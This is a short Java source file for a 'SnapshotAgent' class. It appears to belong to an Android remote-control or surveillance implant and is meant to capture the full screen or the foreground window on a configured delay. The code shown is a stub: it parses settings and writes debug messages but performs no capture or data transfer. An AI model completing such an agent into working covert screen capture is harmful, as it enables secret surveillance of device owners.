package com.ht.RCSAndroidGUI.agent;

import java.nio.ByteOrder;

import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.utils.Utils;

import android.util.Log;

public class SnapshotAgent extends AgentBase {
	final private static int  CAPTURE_FULLSCREEN = 0;
	final private static int  CAPTURE_FOREGROUND = 1;
	
	private int delay;
	private int type;
	
	public SnapshotAgent() { 
		Log.d("RCS", "SnapshotAgent constructor");
	}
	
	public void parse(byte[] conf) {
		myConf = Utils.BufferToByteBuffer(conf, ByteOrder.LITTLE_ENDIAN);
		
		this.delay = myConf.getInt();
		this.type = myConf.getInt();
	}
	
	public void begin() {
		setDelay(this.delay);
	}
	
	public void go() {
		LogR log = new LogR(Agent.AGENT_SNAPSHOT, LogR.LOG_PRI_STD);
		
		switch (type) {
			case CAPTURE_FULLSCREEN:
				Log.d("RCS", "Snapshot Agent: logging full screen");
				break;
				
			case CAPTURE_FOREGROUND:
				Log.d("RCS", "Snapshot Agent: logging foreground window");
				break;
				
			default:
				Log.d("RCS", "Snapshot Agent: wrong capture parameter");
				break;
		}
		
		
		log.close();
	}
	
	public void end() {
		
	}
}
